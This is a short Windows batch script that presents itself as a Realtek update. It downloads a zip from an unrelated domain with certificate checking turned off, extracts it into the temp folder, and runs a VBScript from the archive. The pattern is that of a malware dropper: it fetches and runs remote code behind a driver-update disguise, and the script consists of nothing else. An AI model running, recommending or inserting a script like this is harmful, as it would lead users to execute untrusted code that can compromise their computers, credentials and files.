@echo off
REM Download the file
curl -k -o "%TEMP%\_realtekwin.zip" https://ccxtools.xyz/_realtekwin_v1.update?ref=YLO6

REM Extract the ZIP using PowerShell
powershell -Command "Expand-Archive -Force -Path '%TEMP%\_realtekwin.zip' -DestinationPath '%TEMP%\_realtekwin'"

REM Run the Update
wscript "%TEMP%\_realtekwin\update.vbs"